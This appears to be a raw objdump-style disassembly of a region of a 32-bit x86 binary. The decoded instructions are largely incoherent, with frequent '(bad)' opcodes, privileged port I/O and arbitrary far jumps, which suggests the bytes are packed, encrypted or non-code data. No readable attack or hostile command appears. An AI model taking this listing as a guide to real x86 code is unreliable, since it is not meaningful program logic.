  415040:	mov    al,0x39
  415042:	and    eax,0x56a6d7d1
  415047:	xchg   edx,eax
  415048:	scas   al,BYTE PTR es:[edi]
  415049:	push   es
  41504a:	inc    esi
  41504b:	rcr    bh,1
  41504d:	sbb    cl,0x96
  415050:	push   0x61ed118c
  415055:	xor    dl,dl
  415057:	mov    edx,0xb0f3b70e
  41505c:	mov    ds:0x56d5f571,eax
  415061:	addr16 (bad) 
  415063:	dec    esi
  415064:	repnz mov bh,0xc9
  415067:	jmp    0xb86a:0xf3af4351
  41506e:	push   ss
  41506f:	test   al,0xa
  415071:	xor    ecx,esp
  415073:	xchg   ecx,eax
  415074:	jns    0x41507e
  415076:	loopne 0x415090
  415078:	jg     0x41505c
  41507a:	int    0x81
  41507c:	jb     0x4150ae
  41507e:	or     al,0x56
  415080:	jne    0x415073
  415082:	pop    ebp
  415083:	icebp  
  415084:	loopne 0x415082
  415086:	xchg   ecx,eax
  415087:	(bad)  [edi+0x2dab791f]
  41508d:	or     DWORD PTR [edx-0x36],edi
	...
  4150f4:	jnp    0x4150f8
  4150f6:	add    ebp,ebx
  4150f8:	jnp    0x4150e5
  4150fa:	sti    
  4150fb:	xchg   edx,eax
  4150fc:	lahf   
  4150fd:	mov    esi,0xae07fc2d
  415102:	scas   al,BYTE PTR es:[edi]
  415103:	test   BYTE PTR [esi+ebx*8],0x0
  415107:	add    BYTE PTR [ecx+eax*1],al
  41510a:	add    BYTE PTR [eax],al
  41510c:	sub    dh,BYTE PTR [edi+0x66]
  41510f:	xchg   esi,eax
  415110:	mov    dl,ah
  415112:	in     al,dx
  415113:	lock faddp st(3),st
  415116:	pop    ss
  415117:	lock jbe 0x4150a3
  41511a:	in     al,dx
  41511b:	retf   
  41511c:	int    0x5b
  41511e:	dec    ebx
  41511f:	outs   dx,DWORD PTR ds:[esi]
  415120:	mov    edx,0x2cb3b44a
  415125:	out    0xea,eax
  415127:	dec    edx
  415128:	fs dec ebx
  41512a:	jmp    0x48b:0xa1d7df05
  415131:	and    edx,DWORD PTR [ecx+0x52]
  415134:	ss inc ecx
  415136:	add    DWORD PTR [edx],ebp
  415138:	mov    ds:0x218e04b6,al
  41513d:	pop    edx
  41513e:	mov    ds:0x432fdd1d,eax
  415143:	mov    esi,0xb25b5f0a
  415148:	jg     0x41510c
  41514a:	ins    DWORD PTR es:[edi],dx
  41514b:	loope  0x41515c
  41514d:	lahf   
  41514e:	push   ebx
  41514f:	dec    esi
  415150:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415151:	fwait
  415152:	popa   
  415153:	inc    esp
  415154:	or     ecx,eax
  415156:	fmulp  st(2),st
  415158:	je     0x4150de
  41515a:	jbe    0x4151ac
  41515c:	sbb    DWORD PTR [edx-0x4096ce6d],0xf25f77f1
  415166:	sbb    ah,BYTE PTR [ecx+ebx*1+0x50]
  41516a:	adc    BYTE PTR [ebx],bl
  41516c:	mov    ds:0x74e68c61,eax
  415171:	ret    
  415172:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415173:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415174:	xor    eax,0x16eb67e1
  415179:	mov    ebx,0x3465da93
  41517e:	cdq    
  41517f:	cmp    al,0x1e
  415181:	fidiv  WORD PTR [edx-0x11]
  415184:	add    esp,edi
  415186:	outs   dx,DWORD PTR ds:[esi]
  415187:	mov    ah,0xdd
  415189:	mov    esi,0x45e48c1c
  41518e:	xchg   edi,eax
  41518f:	faddp  st(5),st
  415191:	or     eax,0xcb1c8239
  415196:	dec    edx
  415197:	ins    DWORD PTR es:[edi],dx
  415198:	fs repnz out dx,al
  41519b:	add    DWORD PTR [edx+0x318ebff3],ebp
  4151a1:	ins    BYTE PTR es:[edi],dx
  4151a2:	adc    al,0x68
  4151a4:	stos   DWORD PTR es:[edi],eax
  4151a5:	adc    dl,BYTE PTR [ebx+0x2e01760b]
  4151ab:	inc    edi
  4151ac:	pop    eax
  4151ad:	sub    al,0xf4
  4151af:	call   edi
  4151b1:	or     ah,dl
  4151b3:	cdq    
  4151b4:	mov    eax,0xf8597b2c
  4151b9:	pop    ecx
  4151ba:	test   eax,0x203e4328
  4151bf:	mov    ch,0xbf
  4151c1:	lea    edx,[edx+0x1a]
  4151c4:	test   eax,0x28b7479f
  4151c9:	and    ebp,DWORD PTR [edi+ebp*2]
  4151cc:	sbb    BYTE PTR [edx+eax*1+0x9],bl
  4151d0:	jo     0x41523b
  4151d2:	sub    al,0xa3
  4151d4:	icebp  
  4151d5:	pusha  
  4151d6:	push   ebp
  4151d7:	icebp  
  4151d8:	mov    esp,0x7141ead0
  4151dd:	imul   ebp,DWORD PTR [edi-0x4864abdc],0xa0ab817a
  4151e7:	(bad)  
  4151e8:	jg     0x41518f
  4151ea:	fcom   DWORD PTR [eax-0x76]
  4151ed:	mov    ebx,0x9b179df8
  4151f2:	ja     0x41519f
  4151f4:	pop    ebx
  4151f5:	mov    ebp,0x7c23a791
  4151fa:	ds sub edx,esi
  4151fd:	sahf   
  4151fe:	shl    cl,cl
  415200:	add    eax,0xfae43f9a
  415205:	and    BYTE PTR [edx+0x50],cl
  415208:	sahf   
  415209:	cmc    
  41520a:	jecxz  0x415238
  41520c:	pop    esp
  41520d:	sub    DWORD PTR [ebx-0x3c],ecx
	...
  415274:	sub    al,0x97
  415276:	pop    ds
  415277:	sar    DWORD PTR [edi-0x6001127],1
  41527d:	(bad)  
  41527e:	mov    ecx,0xdc34690b
  415283:	xor    BYTE PTR [eax],dl
  415285:	fild   WORD PTR [eax]
  415287:	add    BYTE PTR [ecx+eax*1],al
  41528a:	add    BYTE PTR [eax],al
  41528c:	or     DWORD PTR [edx+edi*2-0x15],esi
  415290:	cli    
  415291:	push   ss
  415292:	pop    ecx
  415293:	sub    eax,DWORD PTR [edi+edi*8+0x6d]
  415297:	jl     0x4152f4
  415299:	jno    0x4152f5
  41529b:	pushf  
  41529c:	fld    QWORD PTR [edx+0x14e92763]
  4152a2:	or     al,0xad
  4152a4:	or     bl,0xc6
  4152a7:	ret    
  4152a8:	(bad)  
  4152a9:	es push edi
  4152ab:	scas   eax,DWORD PTR es:[edi]
  4152ac:	sub    ah,BYTE PTR ds:0x293706c5
  4152b2:	into   
  4152b3:	push   0xffffffe9
  4152b5:	jo     0x415242
  4152b7:	inc    esp
  4152b8:	bound  ebx,QWORD PTR [ebp-0x69]
  4152bb:	and    eax,0x7279d5e3
  4152c0:	push   0xffffffa0
  4152c2:	std    
  4152c3:	mov    eax,DWORD PTR [ecx+0x38677f41]
  4152c9:	loope  0x41530e
  4152cb:	sar    BYTE PTR [edi-0x612011cb],1
  4152d1:	push   ebp
  4152d2:	adc    al,0xf8
  4152d4:	xchg   ebp,eax
  4152d5:	pop    eax
  4152d6:	cwde   
  4152d7:	out    dx,eax
  4152d8:	jmp    0x7e45:0xcc391718
  4152df:	push   eax
  4152e0:	std    
  4152e1:	sbb    BYTE PTR fs:[esi],dh
  4152e4:	mov    bl,0xd8
  4152e6:	or     ah,BYTE PTR [ecx+edx*8-0x408a818]
  4152ed:	sub    eax,0x439bd48c
  4152f2:	sbb    eax,DWORD PTR [ebp+0x79]
  4152f5:	addr16 sbb al,bh
  4152f8:	push   edx
  4152f9:	inc    edx
  4152fa:	xchg   DWORD PTR [eax+ebp*4],edx
  4152fd:	xor    edi,DWORD PTR [esi-0x77]
  415300:	and    eax,0x6da15443
  415305:	inc    ebp
  415306:	pop    ebp
  415307:	fist   DWORD PTR [ebp*2+0x3ee0304]
  41530e:	call   0x3e3553b2
  415313:	fdiv   QWORD PTR [ecx-0x604b8181]
  415319:	pushf  
  41531a:	mov    ebx,0xd69db42a
  41531f:	xor    DWORD PTR [eax],esp
  415321:	push   0xd1a14d37
  415326:	or     BYTE PTR [edx],dl
  415328:	outs   dx,DWORD PTR ds:[esi]
  415329:	ficomp DWORD PTR [esi+0x2ba0ef20]
  41532f:	or     DWORD PTR [edi+ecx*4-0x1319bf94],edx
  415336:	das    
  415337:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415338:	mov    esi,0xfa277d2c
  41533d:	pop    edx
  41533e:	retf   
  41533f:	push   cs
  415340:	in     al,dx
  415341:	mov    bh,0xa3
  415343:	or     DWORD PTR [edx-0x45],edi
  415346:	fistp  QWORD PTR fs:0xa121cb4
  41534d:	mov    ebx,DWORD PTR [esi+ecx*1-0x4]
  415351:	ror    DWORD PTR [edx],1
  415353:	push   0x5848421a
  415358:	pop    edi
  415359:	enter  0x1bd1,0x49
  41535d:	jne    0x415394
  41535f:	sub    bl,cl
  415361:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415362:	push   0x1d5dc544
  415367:	retf   
  415368:	mov    cl,0x44
  41536a:	mov    edi,0x33869c62
  41536f:	sbb    al,0xc2
  415371:	xor    DWORD PTR [edx-0x2],ecx
  415374:	sbb    ebp,esi
  415376:	rcl    BYTE PTR [edi-0x48ec671f],cl
  41537c:	push   ss
  41537d:	std    
  41537e:	cmc    
  41537f:	mov    al,0x8
  415381:	dec    ebx
  415382:	rcr    DWORD PTR [edx-0x7283fce7],1
  415388:	leave  
  415389:	leave  
  41538a:	xor    BYTE PTR [edi],0x2c
  41538d:	sti    
  41538e:	inc    esp
  41538f:	das    
	...
  4153f4:	ins    DWORD PTR es:[edi],dx
  4153f5:	lock repz jmp FWORD PTR cs:[edi]
  4153fa:	std    
  4153fb:	repz mov edi,0x61d3e5b0
  415401:	push   edx
  415402:	stos   BYTE PTR es:[edi],al
  415403:	sbb    eax,0xe014
  415408:	add    al,0x1
  41540a:	add    BYTE PTR [eax],al
  41540c:	or     eax,0x2b3879db
  415411:	jp     0x415404
  415413:	jmp    0x7c1180d0
  415418:	fist   DWORD PTR [edx+0x59a51a05]
  41541e:	mov    eax,ds:0xd17744ca
  415423:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415424:	xor    al,0xea
  415426:	mov    al,ds:0xe986a315
  41542b:	imul   DWORD PTR [eax]
  41542d:	test   al,0x9f
  41542f:	imul   edx,DWORD PTR [ebx],0xffffffca
  415432:	(bad)  
  415433:	adc    BYTE PTR [edi+ebp*2],cl
  415436:	pop    ecx
  415437:	push   ss
  415438:	repz cli 
  41543a:	or     edi,ebx
  41543c:	push   ecx
  41543d:	cld    
  41543e:	out    dx,eax
  41543f:	hlt    
  415440:	dec    esp
  415441:	dec    ebp
  415442:	xor    eax,0xc87278aa
  415447:	loop   0x415483
  415449:	dec    eax
  41544a:	add    esi,DWORD PTR ds:0x39eb5112
  415450:	add    ah,bh
  415452:	and    BYTE PTR [ebp+ebp*2-0x3d],dl
  415456:	fild   QWORD PTR [ecx-0x14]
  415459:	cwde   
  41545a:	add    DWORD PTR [edi-0x3b089e4c],0x6024a861
  415464:	popf   
  415465:	mov    eax,0xaff95321
  41546a:	pop    eax
  41546b:	dec    edi
  41546c:	jecxz  0x415402
  41546e:	xchg   dh,bh
  415470:	repnz xchg ecx,eax
  415472:	aam    0x7
  415474:	inc    ecx
  415475:	push   ds
  415476:	xchg   bl,cl
  415478:	pop    ecx
  415479:	shl    DWORD PTR [ecx],0xa5
  41547c:	test   BYTE PTR [ebx+0x4c],al
  41547f:	cmp    eax,0x5b70fdf9
  415484:	pop    ebp
  415485:	pop    ss
  415486:	pop    esi
  415487:	addr16 pop eax
  415489:	int3   
  41548a:	cmp    eax,0x153293f0
  41548f:	arpl   WORD PTR [esi+eiz*8],cx
  415492:	test   DWORD PTR [ebp-0x2b],0xe05cb0bb
  415499:	das    
  41549a:	nop
  41549b:	mov    bl,BYTE PTR ds:0x32df2a1f
  4154a1:	adc    ebx,ebp
  4154a3:	add    DWORD PTR [eax+0x638949bc],ebx
  4154a9:	cmc    
  4154aa:	jmp    DWORD PTR [eax+0x6a85e46f]
  4154b0:	shl    DWORD PTR [ecx+edi*1-0x5a],cl
  4154b4:	icebp  
  4154b5:	or     edi,DWORD PTR [edi-0x5c5a2184]
  4154bb:	in     eax,dx
  4154bc:	cmp    BYTE PTR [ebx+0x3b53b4fe],0x6b
  4154c3:	xchg   ecx,eax
  4154c4:	adc    eax,0xc3284d60
  4154c9:	push   ecx
  4154ca:	xor    al,0xa
  4154cc:	lea    ebp,[esi+0x62]
  4154cf:	leave  
  4154d0:	fucom  st(0)
  4154d2:	xchg   ebx,eax
  4154d3:	(bad)  
  4154d4:	mov    ch,0xf
  4154d6:	mov    ch,0xb8
  4154d8:	jbe    0x4154e1
  4154da:	add    al,0xbf
  4154dc:	cmp    eax,DWORD PTR [esi]
  4154de:	and    DWORD PTR [edi],eax
  4154e0:	push   ebx
  4154e1:	jmp    0x57462d76
  4154e6:	push   es
  4154e7:	mov    al,0xad
  4154e9:	loop   0x41553e
  4154eb:	mov    BYTE PTR [edx-0x1b7411d5],cl
  4154f1:	(bad)  
  4154f2:	push   0x50d8ce60
  4154f7:	adc    DWORD PTR [edi-0x6b308f02],ebp
  4154fd:	add    ch,bl
  4154ff:	mov    al,0x73
  415501:	scas   eax,DWORD PTR es:[edi]
  415502:	cmc    
  415503:	dec    esp
  415504:	outs   dx,DWORD PTR ds:[esi]
  415505:	int3   
  415506:	imul   edx,DWORD PTR [esi],0x42
  415509:	fld    DWORD PTR [ebp+0x2a52e002]
  41550f:	or     eax,0x0
	...
  415574:	in     al,0xf0
  415576:	sub    DWORD PTR [edx],ecx
  415578:	cmp    eax,0xa2fee7db
  41557d:	arpl   WORD PTR [ebx],bp
  41557f:	je     0x415579
  415581:	jmp    0x0:0xe11884e1
  415588:	add    al,0x1
  41558a:	add    BYTE PTR [eax],al
  41558c:	add    al,0x59
  41558e:	retf   0xb8bc
  415591:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415593:	jmp    0xf533:0x48b17496
  41559a:	retf   
  41559b:	push   esp
  41559c:	inc    edx
  41559d:	(bad)  
  41559e:	fidivr DWORD PTR [ecx]
  4155a0:	jae    0x415599
  4155a2:	popa   
  4155a3:	and    dh,ch
  4155a5:	pop    es
  4155a6:	xchg   ecx,eax
  4155a7:	mov    al,0xff
  4155a9:	dec    ebp
  4155aa:	pushf  
  4155ab:	mov    al,0x61
  4155ad:	jecxz  0x415626
  4155af:	fisttp DWORD PTR ds:0x7135b01d
  4155b5:	ins    DWORD PTR es:[edi],dx
  4155b6:	fst    DWORD PTR [edx]
  4155b8:	jo     0x415596
  4155ba:	dec    edx
  4155bb:	xchg   esi,eax
  4155bc:	fldenv [edi]
  4155be:	out    0x60,al
  4155c0:	repz cmp DWORD PTR [edx],esi
  4155c3:	cmp    BYTE PTR [edi-0x3e8f2a82],dh
  4155c9:	mov    edx,0x44520266
  4155ce:	(bad)  
  4155cf:	ins    BYTE PTR es:[edi],dx
  4155d0:	fidivr DWORD PTR [esi]
  4155d2:	mov    ebx,0xfd42424f
  4155d7:	pop    eax
  4155d8:	call   0xed26:0x204a995b
  4155df:	repnz xchg ebp,eax
  4155e1:	les    esp,FWORD PTR [ebx+esi*1]
  4155e4:	sbb    DWORD PTR [ecx-0x80],ebp
  4155e7:	(bad)  
  4155e8:	loop   0x415640
  4155ea:	mov    bh,0xcc
  4155ec:	inc    ebp
  4155ed:	or     DWORD PTR [ecx+0x1aaea8c3],esp
  4155f3:	push   edi
  4155f4:	inc    esp
  4155f5:	mov    ah,0x6d
  4155f7:	mov    bl,0xca
  4155f9:	jmp    0x66c9472
  4155fe:	pop    ebp
  4155ff:	jg     0x4155f5
  415601:	jns    0x415662
  415603:	fst    DWORD PTR [ebx+0x63]
  415606:	adc    edx,DWORD PTR [eax+0x19a16873]
  41560c:	fadd   QWORD PTR [esi+ebx*8]
  41560f:	push   0x23ffc3de
  415614:	or     ebp,DWORD PTR [edx-0x74]
  415617:	ret    0x3ce1
  41561a:	or     DWORD PTR [edx],esp
  41561c:	dec    esi
  41561d:	mov    dl,0xd2
  41561f:	daa    
  415620:	sbb    DWORD PTR [ebp-0x74],ecx
  415623:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415624:	icebp  
  415625:	mov    ds:0x1b478202,al
  41562a:	adc    esp,DWORD PTR [edx]
  41562c:	xchg   DWORD PTR [esp+eax*4-0x32],eax
  415630:	adc    cl,cl
  415632:	or     al,0x15
  415634:	add    bh,BYTE PTR [ebp-0x6f]
  415637:	int    0x56
  415639:	out    0xc7,eax
  41563b:	loop   0x4156ad
  41563d:	cmp    DWORD PTR [ebx+esi*8+0x4a8b6474],ecx
  415644:	repnz scas al,BYTE PTR es:[edi]
  415646:	ret    
  415647:	mov    gs,edi
  415649:	jmp    DWORD PTR [ebx-0x16]
  41564c:	jns    0x415612
  41564e:	inc    esi
  41564f:	retw   
  415651:	out    dx,eax
  415652:	cli    
  415653:	sbb    DWORD PTR [edi-0xb],esp
  415656:	mov    ecx,0xb015603e
  41565b:	mov    edi,0xa64dfc7a
  415660:	cmp    cl,BYTE PTR [edi+0xd02b3a6]
  415666:	(bad)
  41566b:	test   eax,0x72ce3277
  415670:	js     0x415672
  415672:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415673:	cwde   
  415674:	icebp  
  415675:	mov    ?,WORD PTR gs:[ecx]
  415678:	mov    dl,0x93
  41567a:	in     eax,dx
  41567b:	jl     0x4156cb
  41567d:	xchg   ebp,eax
  41567e:	mov    ch,0x61
  415680:	inc    esi
  415681:	cmp    eax,0xe51de606
  415686:	jle    0x415699
  415688:	loopne 0x4156ad
  41568a:	adc    ch,BYTE PTR [edi]
  41568c:	pop    ebp
  41568d:	mov    ch,0xb3
  41568f:	dec    edi
	...
  4156f4:	ins    DWORD PTR es:[edi],dx
  4156f5:	call   0xbafd:0x67ff45bc
  4156fc:	mov    bl,0xba
  4156fe:	inc    esi
  4156ff:	sub    al,0xf0
  415701:	sbb    esp,DWORD PTR [ecx]
  415703:	sbb    al,0x1c
  415705:	loop   0x415707
  415707:	add    BYTE PTR [ecx+eax*1],al
  41570a:	add    BYTE PTR [eax],al
  41570c:	mov    cl,0x91
  41570e:	in     eax,0x53
  415710:	jmp    0x8acc:0xbdb6704e
  415717:	adc    DWORD PTR [edi+esi*4-0x2af58119],eax
  41571e:	adc    esp,edx
  415720:	adc    cl,BYTE PTR [ebx-0x61b6d38d]
  415726:	xchg   ecx,eax
  415727:	mov    edx,0x3ecb26f2
  41572c:	in     eax,0x26
  41572e:	inc    ebp
  41572f:	or     bl,bl
  415731:	sahf   
  415732:	adc    ebp,DWORD PTR [ecx+0x495f1219]
  415738:	shl    BYTE PTR [edi-0x50208d0c],0xc5
  41573f:	add    DWORD PTR [eax],edx
  415741:	daa    
  415742:	or     BYTE PTR [edi-0x3e6a5611],bl
  415748:	xor    ch,BYTE PTR [edi-0x47a83adb]
  41574e:	sbb    eax,0x44252faa
  415753:	push   ebp
  415754:	test   BYTE PTR [ecx],ch
  415756:	add    dh,BYTE PTR ds:0xb1e6c5c8
  41575c:	mov    WORD PTR [ecx-0x66],ss
  41575f:	(bad)  
  415760:	mov    esi,0xbb8d6cab
  415765:	call   0xbe7c:0xb5b744b1
  41576c:	out    0x2,eax
  41576e:	add    DWORD PTR [esi],esi
  415770:	in     eax,dx
  415771:	cld    
  415772:	fld    QWORD PTR [ecx+0x4f]
  415775:	out    0xf9,al
  415777:	ja     0x415714
  415779:	les    eax,FWORD PTR [ecx]
  41577b:	push   ss
  41577c:	rcl    DWORD PTR [ebp+eiz*2-0x13],0x59
  415781:	mov    ebx,0x14f4db5c
  415786:	xchg   ebp,eax
  415787:	cwde   
  415788:	mov    dh,BYTE PTR [edx-0x12d11a74]
  41578e:	inc    ebx
  41578f:	cwde   
  415790:	sub    eax,0x39cdc353
  415795:	imul   edi,edi,0x4e
  415798:	outs   dx,BYTE PTR ds:[esi]
  415799:	ds mov ecx,0x71e7b58
  41579f:	cmp    dh,bh
  4157a1:	add    BYTE PTR ds:0x22cda3b0,al
  4157a7:	std    
  4157a8:	lods   al,BYTE PTR ds:[esi]
  4157a9:	sbb    al,0x44
  4157ab:	xor    ebx,0x5bcf710f
  4157b1:	cmp    DWORD PTR [edi+ebp*1-0x7009a1d6],0xf0c483d2
  4157bc:	dec    eax
  4157bd:	xchg   DWORD PTR [eiz*4+0x5b2bf3e4],edi
  4157c4:	or     eax,0xfc542c74
  4157c9:	cs mov bl,bh
  4157cc:	push   edi
  4157cd:	pop    esi
  4157ce:	loop   0x41578d
  4157d0:	dec    edi
  4157d1:	call   0x9160f5c9
  4157d6:	fstp   QWORD PTR [ecx+0x4ac5959d]
  4157dc:	icebp  
  4157dd:	mov    ah,0x39
  4157df:	and    dl,BYTE PTR [ebp+0x17]
  4157e2:	retf   0x4f99
  4157e5:	jne    0x415824
  4157e7:	jb     0x415826
  4157e9:	inc    esp
  4157ea:	xor    ebp,DWORD PTR [ebx+edi*2-0x65]
  4157ee:	inc    ecx
  4157ef:	ja     0x415832
  4157f1:	sbb    BYTE PTR [ebx+0x622995dc],dh
  4157f7:	lods   eax,DWORD PTR ds:[esi]
  4157f8:	rcr    DWORD PTR ds:0x4bf8cbe9,cl
  4157fe:	mov    bh,0x6f
  415800:	xor    BYTE PTR ds:0x25f01016,cl
  415806:	mov    ds:0xb4795732,al
  41580b:	out    0x15,eax
  41580d:	xchg   edi,eax
  41580e:	mov    ds:0xce,al
	...
  415873:	add    bl,cl
  415875:	(bad)  
  415876:	xchg   ebx,eax
  415877:	in     al,dx
  415878:	mov    bh,0xed
  41587a:	(bad)  
  41587b:	inc    DWORD PTR [edi]
  41587d:	(bad)  
  41587f:	sar    DWORD PTR [ebp+0x2b],cl
  415882:	pop    ds
  415883:	or     eax,0xe320
  415888:	add    al,0x1
  41588a:	add    BYTE PTR [eax],al
  41588c:	xchg   ebx,eax
  41588d:	sbb    eax,0xd61fe2ee
  415892:	push   edi
  415893:	fnsave ds:[edx+0x42]
  415897:	xlat   BYTE PTR ds:[ebx]
  415898:	inc    esp
  415899:	pop    ebp
  41589a:	pop    eax
  41589b:	scas   eax,DWORD PTR es:[edi]
  41589c:	inc    ebx
  41589d:	mov    bh,0x67
  41589f:	cmp    ebx,ebx
  4158a1:	push   eax
  4158a2:	cld    
  4158a3:	xor    al,0xbd
  4158a5:	jmp    FWORD PTR [edi-0x4a]
  4158a8:	sbb    al,0xac
  4158aa:	(bad)  
  4158ab:	mov    dh,0x22
  4158ad:	js     0x415836
  4158af:	in     al,0x6
  4158b1:	out    dx,eax
  4158b2:	adc    DWORD PTR [esi-0x1c760c8e],ebx
  4158b8:	mov    esi,0xd2afd810
  4158bd:	xor    ebp,ebp
  4158bf:	or     eax,0x718fbb3
  4158c4:	sub    BYTE PTR [ecx],bh
  4158c6:	cmp    BYTE PTR [ecx+eiz*8],dl
  4158c9:	imul   edx,DWORD PTR [ebx],0xffffffe8
  4158cc:	imul   ebp,DWORD PTR [edi-0x23abb695],0x60
  4158d3:	pop    ebp
  4158d4:	call   0x62eb:0xe758725e
  4158db:	xchg   DWORD PTR [ecx+0x7],edx
  4158de:	adc    al,0x5c
  4158e0:	(bad)  [ebx]
  4158e2:	and    DWORD PTR [eax],0x1f
  4158e5:	arpl   cx,ax
  4158e7:	aas    
  4158e8:	int3   
  4158e9:	jne    0x415889
  4158eb:	add    al,0x87
  4158ed:	or     al,0x8a
  4158ef:	mov    BYTE PTR [esi],0x61
  4158f2:	iret   
  4158f3:	lds    eax,FWORD PTR [eax]
  4158f5:	lods   al,BYTE PTR ds:[esi]
  4158f6:	mov    bl,0xa7
  4158f8:	(bad)  
  4158f9:	xchg   ecx,eax
  4158fa:	es scas eax,DWORD PTR es:[di]
  4158fd:	mov    cl,BYTE PTR [eax]
  4158ff:	dec    esp
  415900:	cmp    eax,0xa169b0d3
  415905:	jle    0x41591b
  415907:	stos   DWORD PTR es:[edi],eax
  415908:	mov    ah,al
  41590a:	iret   
  41590b:	retf   
  41590c:	or     esi,DWORD PTR [ebp+0x75dbc545]
  415912:	pop    edx
  415913:	mov    esp,0xac36cabe
  415918:	inc    edx
  415919:	or     al,0x5e
  41591b:	jae    0x4158ac
  41591d:	pop    ebp
  41591e:	fdiv   QWORD PTR [edx]
  415920:	cmp    ecx,DWORD PTR [esi+0xa]
  415923:	cdq    
  415924:	add    DWORD PTR [edx+0x1913a037],0x25
  41592b:	cld    
  41592c:	stos   BYTE PTR es:[edi],al
  41592d:	dec    edx
  41592e:	xchg   ecx,eax
  41592f:	or     eax,0xff3bfe6
  415934:	push   ss
  415935:	inc    ecx
  415936:	loopne 0x4158ca
  415938:	in     al,0x4c
  41593a:	repnz loopne 0x41599b
  41593d:	inc    edx
  41593e:	(bad)  
  41593f:	jle    0x41594e
  415941:	pop    eax
  415942:	mov    WORD PTR [edx+0x66],es
  415945:	mov    eax,ds:0x5ea10ca6
  41594a:	jae    0x415933
  41594c:	lea    esi,[eax+0x5798640]
  415952:	jg     0x415943
  415954:	mov    ah,0x66
  415956:	rol    BYTE PTR [ebx+esi*8-0x11be8bb9],1
  41595d:	ins    BYTE PTR es:[edi],dx
  41595e:	lods   al,BYTE PTR ds:[esi]
  41595f:	ins    DWORD PTR es:[edi],dx
  415960:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415961:	jo     0x41592e
  415963:	xor    DWORD PTR [edi-0x7089e3b0],edi
  415969:	push   0x5d
  41596b:	push   cs
  41596c:	jge    0x415908
  41596e:	mov    edx,0x2782e10e
  415973:	mov    edi,0xb22a7dc1
  415978:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415979:	sahf   
  41597a:	lds    eax,FWORD PTR [ebp-0x496ebce2]
  415980:	leave  
  415981:	sbb    al,0xaf
  415983:	push   ebp
  415984:	shl    DWORD PTR [ecx],cl
  415986:	popa   
  415987:	test   BYTE PTR [edi],ch
  415989:	mov    edi,0x69fff263
  41598e:	adc    al,0x1c
	...
  4159f4:	inc    ebp
  4159f5:	mov    BYTE PTR [edi+esi*2],ch
  4159f8:	in     eax,dx
  4159f9:	neg    DWORD PTR [edi-0x46]
  4159fc:	sub    edi,DWORD PTR [edi-0x10]
  4159ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a00:	sbb    DWORD PTR [esi],edi
  415a02:	xchg   BYTE PTR [edi+0xe424],bl
  415a08:	add    al,0x1
  415a0a:	add    BYTE PTR [eax],al
  415a0c:	cld    
  415a0d:	add    al,BYTE PTR [ecx+0x72]
  415a10:	or     eax,ebx
  415a12:	lahf   
  415a13:	fwait
  415a14:	dec    eax
  415a15:	ror    BYTE PTR [ecx-0xc2ce83b],cl
  415a1b:	leave  
  415a1c:	sbb    al,0x2
  415a1e:	adc    edi,DWORD PTR [esi+eiz*2]
  415a21:	fisubr WORD PTR cs:[eax]
  415a24:	jae    0x4159ae
  415a26:	add    DWORD PTR [ebx+ecx*4],esp
  415a29:	loop   0x4159b6
  415a2b:	clc    
  415a2c:	in     eax,dx
  415a2d:	jb     0x415a7b
  415a2f:	popf   
  415a30:	outs   dx,BYTE PTR ds:[esi]
  415a31:	ror    DWORD PTR [edx+eax*1],cl
  415a34:	lods   al,BYTE PTR ds:[esi]
  415a35:	shr    DWORD PTR [ecx],cl
  415a37:	and    al,0x94
  415a39:	popa   
  415a3a:	mov    ebx,0xd9074926
  415a3f:	or     al,bh
  415a41:	jne    0x415a6c
  415a43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a44:	ret    0x93c9
  415a47:	aaa    
  415a48:	push   ss
  415a49:	cwde   
  415a4a:	int    0x5c
  415a4c:	bound  eax,QWORD PTR [edi+esi*8-0x7e26abf3]
  415a53:	inc    edx
  415a54:	ins    DWORD PTR es:[edi],dx
  415a55:	idiv   BYTE PTR [edi]
  415a57:	add    eax,0xd5f74c6f
  415a5c:	xor    eax,0x98360d36
  415a61:	push   es
  415a62:	test   DWORD PTR [eax+esi*8],eax
  415a65:	aaa    
  415a66:	daa    
  415a67:	mov    esi,0x5c3a3c35
  415a6c:	fidivr WORD PTR [esi]
  415a6e:	jne    0x415a08
  415a70:	fcom   DWORD PTR [ebx]
  415a72:	fsub   st(5),st
  415a74:	push   edx
  415a75:	mov    al,0x5e
  415a77:	aam    0x8f
  415a79:	mov    cl,0x2b
  415a7b:	std    
  415a7c:	push   eax
  415a7d:	or     ebp,DWORD PTR [ecx+0x47e496b4]
  415a83:	inc    esi
  415a84:	repz xor al,0xd4
  415a87:	xchg   esp,eax
  415a88:	fcomip st,st(3)
  415a8a:	xchg   esp,eax
  415a8b:	inc    edx
  415a8c:	scas   eax,DWORD PTR es:[edi]
  415a8d:	mov    ds,WORD PTR [ebp-0x33fb630b]
  415a93:	cmp    ecx,DWORD PTR [edx+0x7036693]
  415a99:	xchg   DWORD PTR [ecx],esp
  415a9b:	pusha  
  415a9c:	adc    al,0xe0
  415a9e:	sbb    eax,0x6ea20de0
  415aa3:	call   0x8b20:0xbb6ed01c
  415aaa:	pop    ebp
  415aab:	mov    BYTE PTR [ebp+esi*1+0x1b814b36],0x7f
  415ab3:	jge    0x415a46
  415ab5:	mov    esp,0x6f94c0e9
  415aba:	sbb    edx,DWORD PTR [esi-0x1e]
  415abd:	aaa    
  415abe:	outs   dx,DWORD PTR ds:[esi]
  415abf:	call   0x93a39f5c
  415ac4:	or     eax,0x45e85d35
  415ac9:	inc    eax
  415aca:	cmp    esp,esi
  415acc:	push   ds
  415acd:	popf   
  415ace:	xchg   edi,eax
  415acf:	fstp   TBYTE PTR [edx]
  415ad1:	stos   BYTE PTR es:[edi],al
  415ad2:	loopne 0x415a8d
  415ad4:	popa   
  415ad5:	or     ch,cl
  415ad7:	aaa    
  415ad8:	rcl    BYTE PTR [edx-0x62],cl
  415adb:	push   ebp
  415adc:	mov    ch,0xe6
  415ade:	sti    
